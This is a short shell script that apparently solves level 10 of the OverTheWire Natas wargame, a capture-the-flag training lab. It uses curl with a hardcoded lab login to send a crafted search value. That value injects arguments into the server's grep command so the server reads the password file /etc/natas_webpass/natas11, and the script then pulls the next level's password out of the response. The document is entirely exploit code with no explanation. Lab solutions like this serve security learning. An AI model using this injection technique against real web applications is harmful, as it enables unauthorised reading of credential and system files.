#! /bin/sh

NEEDLE="\".*\" /etc/natas_webpass/natas11 #"
RESPONSE=$(curl -G http://natas10.natas.labs.overthewire.org \
                --silent \
                --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu \
                --data-urlencode "needle=${NEEDLE}" \
                --data-urlencode "submit=Search")
PASSWORD=$(echo ${RESPONSE} | grep -Eo "<pre>.*</pre>" | grep -Eo [A-Za-z0-9]{32})
printf "The password for natas11 is: ${PASSWORD}\n"
